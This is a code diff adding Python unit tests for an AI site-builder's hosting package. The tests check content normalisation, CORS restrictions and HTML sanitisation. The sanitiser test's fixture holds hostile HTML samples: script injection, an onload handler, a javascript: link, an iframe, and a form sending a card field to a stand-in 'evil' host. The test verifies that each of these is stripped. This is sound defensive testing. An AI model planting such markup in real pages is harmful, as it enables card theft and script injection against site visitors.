@@ -1592,6 +1592,17 @@ class HostingTest(unittest.TestCase):
             for root, _, files in os.walk(out):
                 for f in files:  # на хостинге только PHP и HTML (+ необязательные настройки сервера)
                     self.assertTrue(f.endswith((".php", ".html")) or f in (".htaccess", "web.config", "ПРОЧТИ.txt"), f)
+            # нейросеть AI Studio — та же neuro.js, отдельным файлом .php (на хостинге только PHP и HTML)
+            studio = os.path.join(out, "aistudio.rteam.info")
+            with open(os.path.join(studio, "assets", "neuro.php"), encoding="utf-8") as fh:
+                neuro = fh.read()
+            self.assertEqual(neuro.count("<?"), 1)
+            self.assertIn("application/javascript", neuro)
+            self.assertIn("window.RaiNeuro", neuro)
+            with open(os.path.join(studio, "studio.php"), encoding="utf-8") as fh:
+                page = fh.read()
+            for part in ('src="assets/neuro.php"', "assets/studio_ai.php", 'id="aiMode"', 'id="neuroHow"', 'id="stopBtn"'):
+                self.assertIn(part, page)
             with open(os.path.join(rai, "chat.html"), encoding="utf-8") as fh:
                 page = fh.read()
             self.assertIn("ai.php", page)
@@ -1610,6 +1621,91 @@ class HostingTest(unittest.TestCase):
                 self.assertIn("__halt_compiler();", kb)  # данные — сжатые, текстом после __halt_compiler
                 self.assertRegex(kb.split("__halt_compiler();", 1)[1], r"^[A-Za-z0-9+/=\n]+$")
                 self.assertTrue(json.loads(make_hosting.read_kb(os.path.join(rai, "kb.php")))["items"])
+
+    @unittest.skipUnless(__import__("shutil").which("php"), "нет PHP")
+    def test_studio_neural_sites(self):
+        """AI Studio: сайт от нейросети — «тексты + дизайн студии» (save_spec) и «весь код» (save_html), очистка и правки."""
+        import shutil
+        import subprocess
+        base = os.path.dirname(os.path.abspath(__file__))
+        spec = {"title": "Зерно", "tagline": "Кофе, который будит город", "theme": "DARK", "accent": "#C8743A",
+                "sections": [{"kind": "hero", "title": "Зерно", "text": "Главный экран"},
+                             {"kind": "about", "title": "О нас", "text": "<b>Обжариваем</b> зерно сами каждую неделю."},
+                             {"kind": "menu", "title": "Меню", "items": [{"title": "Капучино", "price": "220 ₽", "text": "С пеной"}, "Флэт уайт"]},
+                             {"kind": "prices", "title": "Цены", "items": []},
+                             {"kind": "отзывы", "title": "Отзывы гостей", "items": [{"name": "Аня", "text": "Лучший кофе!"}]},
+                             {"kind": "skills", "title": "Умеем", "items": [{"title": "Пуровер"}, {"title": "Аэропресс"}]},
+                             {"kind": "contacts", "title": "Приходите", "text": "Ждём вас"},
+                             {"kind": "gallery", "title": "Фото", "count": 99}],
+                "contacts": {"email": "hello@example.com", "phone": "+7 900 000-00-00", "telegram": "https://t.me/zerno_cafe"}}
+        bad_html = ("<!DOCTYPE html><html><head><title>TeleBot</title><meta http-equiv=\"refresh\" content=\"0;url=https://evil\">"
+                    "<script>steal()</script><link rel=\"import\" href=\"x.html\"><style>body{color:red}</style></head>"
+                    "<body onload=\"steal()\"><a href=\"javascript:alert(1)\">Купить</a><iframe src=\"https://evil\"></iframe>"
+                    "<form action=\"https://evil/steal\"><input name=\"card\"></form>" + "<section><h2>Раздел</h2><p>Текст</p></section>" * 5 + "</body></html>")
+        script = r'''<?php
+require __DIR__ . '/config.php';
+require __DIR__ . '/sitegen.php';
+$in = json_decode(file_get_contents('php://stdin'), true);
+$out = [];
+$r = studio_save_spec('ann', json_encode($in['spec']), 'Сайт кофейни «Зерно» с меню. Почта zerno@mail.ru', true);
+$out['spec'] = $r['spec'];
+$out['html'] = sg_render(sg_load('ann'));
+$out['public'] = sg_public_spec(sg_load('ann'));
+$out['edit'] = studio_edit('ann', 'сделай синим');           // сайт из «текстов нейросети» правится и шаблонным редактором
+$keep = sg_load('ann');
+$again = $keep; $again['tagline'] = 'Новый слоган'; unset($again['seed']);
+$out['re'] = studio_save_spec('ann', json_encode($again), '', false)['spec'];  // правка нейросетью: сайт тот же
+$out['re_seed'] = $out['re']['seed'] === $keep['seed'];
+$out['empty'] = studio_save_spec('ann', '{"sections": []}', 'x', true);
+$out['save_html'] = studio_save_html('ann', $in['html'], 'бот', '');
+$out['clean'] = sg_render(sg_load('ann'));
+$out['state_spec'] = sg_public_spec(sg_load('ann'));
+$out['edit_html'] = studio_edit('ann', 'сделай синим');
+$out['tiny'] = studio_save_html('ann', '<p>hi</p>', '', '');
+echo json_encode($out, JSON_UNESCAPED_UNICODE);
+'''
+        with tempfile.TemporaryDirectory() as site:
+            shutil.copytree(os.path.join(base, "hosting", "aistudio"), site, dirs_exist_ok=True, ignore=shutil.ignore_patterns("data", "sites"))
+            os.makedirs(os.path.join(site, "data"))
+            os.makedirs(os.path.join(site, "sites"))
+            with open(os.path.join(site, "t.php"), "w", encoding="utf-8") as fh:
+                fh.write(script)
+            r = subprocess.run(["php", os.path.join(site, "t.php")], input=json.dumps({"spec": spec, "html": bad_html}),
+                               capture_output=True, text=True, timeout=60)
+            self.assertEqual(r.returncode, 0, r.stderr)
+            out = json.loads(r.stdout[r.stdout.index("{"):])
+        got = out["spec"]
+        kinds = [(x["kind"], x["title"]) for x in got["sections"]]
+        # главный экран нейросети не дублируется, пустые «Цены» выброшены, неизвестный вид угадан по заголовку, контакты — последними
+        self.assertEqual(kinds, [("about", "О нас"), ("menu", "Меню"), ("reviews", "Отзывы гостей"), ("skills", "Умеем"),
+                                 ("gallery", "Фото"), ("contacts", "Приходите")])
+        self.assertEqual((got["theme"], got["accent"], got["mode"]), ("dark", "#c8743a", "neuro-spec"))
+        self.assertEqual(got["sections"][0]["text"], "Обжариваем зерно сами каждую неделю.")       # без тегов
+        self.assertEqual(got["sections"][1]["items"][1], {"title": "Флэт уайт", "text": ""})       # строка → пункт
+        self.assertEqual(got["sections"][2]["items"][0]["title"], "Аня")                          # name → title
+        self.assertEqual(got["sections"][3]["tags"], ["Пуровер", "Аэропресс"])
+        self.assertEqual(got["sections"][4]["count"], 12)
+        # почта клиента — вместо выдуманной, выдуманный телефон-заглушка не публикуется, телеграм — без ссылки
+        self.assertEqual(got["contacts"], {"email": "zerno@mail.ru", "telegram": "zerno_cafe"})
+        self.assertIn("Капучино", out["html"])
+        self.assertIn("mailto:zerno@mail.ru", out["html"])
+        self.assertTrue("<b>Обжариваем" not in out["html"] and "Обжариваем зерно" in out["html"])
+        self.assertNotIn("prompt", out["public"])
+        self.assertEqual(out["edit"]["spec"]["accent"], "#1e5bff")
+        self.assertEqual(out["re"]["tagline"], "Новый слоган")
+        self.assertTrue(out["re_seed"])                                 # те же картинки после правки
+        self.assertEqual(out["re"]["contacts"]["email"], "zerno@mail.ru")
+        self.assertIn("error", out["empty"])
+        # «весь код»: сервер вырезает всё опасное
+        clean = out["clean"]
+        for bad in ("<script", "steal()", "onload", "javascript:", "<iframe", "http-equiv", 'rel="import"', "https://evil/steal"):
+            self.assertNotIn(bad, clean)
+        self.assertIn("AI Studio Rteam", clean)
+        self.assertIn("<style>body{color:red}</style>", clean)
+        self.assertEqual(out["save_html"]["spec"]["title"], "TeleBot")
+        self.assertIsNone(out["state_spec"])
+        self.assertIn("нейросеть", out["edit_html"]["error"])
+        self.assertIn("error", out["tiny"])
 
     @unittest.skipUnless(__import__("shutil").which("php"), "нет PHP")
     def test_php_servers(self):
@@ -1780,6 +1876,14 @@ class HostingTest(unittest.TestCase):
                 codes = [post("limits.php", {}, csrf)[0] for _ in range(6)]
                 self.assertEqual(codes, [200] * 5 + [429])
                 self.assertEqual(post("limits.php", {}, {"X-CSRF-Token": "bad"})[0], 403)
+                # тот же тариф — и для нейросети AI Studio: лимиты открыты только адресу студии (с cookie входа)
+                for origin, allowed in (("https://aistudio.rteam.info", True), ("https://evil.example", False)):
+                    r = web.open(urllib.request.Request(url + "limits.php", headers={"Origin": origin}))
+                    self.assertEqual(r.headers.get("Access-Control-Allow-Origin"), origin if allowed else None)
+                    self.assertEqual(r.headers.get("Access-Control-Allow-Credentials"), "true" if allowed else None)
+                pre = web.open(urllib.request.Request(url + "limits.php", method="OPTIONS", headers={"Origin": "https://aistudio.rteam.info"}))
+                self.assertEqual(pre.status, 204)
+                self.assertIn("X-CSRF-Token", pre.headers["Access-Control-Allow-Headers"])
 
                 # регистрация → бесплатный тариф: 15 в день, модели Лайт и Стандарт
                 csrf_token = json.loads(get("me.php"))["csrf"]
